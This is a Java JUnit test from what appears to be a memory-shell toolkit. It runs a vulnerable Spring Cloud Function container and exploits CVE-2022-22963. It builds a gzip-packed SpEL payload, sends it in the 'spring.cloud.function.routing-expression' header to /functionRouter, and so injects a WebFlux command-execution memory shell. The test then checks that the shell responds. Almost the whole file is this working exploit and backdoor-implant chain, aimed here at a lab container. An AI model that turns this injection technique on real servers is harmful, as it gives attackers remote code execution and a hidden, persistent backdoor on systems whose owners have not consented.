package com.reajason.javaweb.integration.memshell.springwebflux;

import com.reajason.javaweb.Server;
import com.reajason.javaweb.integration.ShellAssertion;
import com.reajason.javaweb.memshell.MemShellResult;
import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.config.ShellToolConfig;
import com.reajason.javaweb.packer.Packers;
import lombok.SneakyThrows;
import lombok.extern.slf4j.Slf4j;
import net.bytebuddy.jar.asm.Opcodes;
import okhttp3.MediaType;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import org.apache.commons.lang3.tuple.Pair;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.testcontainers.containers.GenericContainer;
import org.testcontainers.containers.wait.strategy.Wait;
import org.testcontainers.junit.jupiter.Container;
import org.testcontainers.junit.jupiter.Testcontainers;

import java.time.Duration;

import static org.junit.jupiter.api.Assertions.assertNotEquals;

@Testcontainers
@Slf4j
public class CVE202222963Test {

    @Container
    public static final GenericContainer<?> cve202222963 =
            new GenericContainer<>("vulhub/spring-cloud-function:3.2.2")
                    .withExposedPorts(8080)
                    .waitingFor(Wait.forHttp("/uppercase")
                            .forStatusCodeMatching(code -> code == 200 || code == 405)
                            .withStartupTimeout(Duration.ofMinutes(3)));

    @Test
    @DisplayName("CVE-2022-22963")
    void CVE_2022_22963() {
        String url = getUrl();
        String shellType = ShellType.SPRING_WEBFLUX_WEB_FILTER;
        String shellTool = ShellTool.Command;
        Packers packer = Packers.SpELSpringGzip;
        Pair<String, String> urls = ShellAssertion.getUrls(url, shellType, shellTool, packer);
        ShellToolConfig shellToolConfig = ShellAssertion.getShellToolConfig(shellType, shellTool, packer);
        MemShellResult generateResult = ShellAssertion.generate(
                urls.getRight(),
                Server.SpringWebFlux,
                null,
                shellType,
                shellTool,
                Opcodes.V1_8,
                shellToolConfig,
                packer);

        String content = packer.getInstance().pack(generateResult.toClassPackerConfig());
        injectBySpringCloudFunction(url, content);
        ShellAssertion.assertShellIsOk(generateResult, urls.getLeft(), shellTool, shellType, null, null);
    }

    @SneakyThrows
    private void injectBySpringCloudFunction(String url, String expression) {
        Request request = new Request.Builder()
                .url(url + "/functionRouter")
                .header("spring.cloud.function.routing-expression", expression)
                .post(RequestBody.create("test", MediaType.parse("text/plain")))
                .build();
        try (Response response = new okhttp3.OkHttpClient().newCall(request).execute()) {
            assertNotEquals(404, response.code());
        }
    }

    private static String getUrl() {
        String host = cve202222963.getHost();
        int port = cve202222963.getMappedPort(8080);
        String url = "http://" + host + ":" + port;
        log.info("container started, app url is : {}", url);
        return url;
    }
}
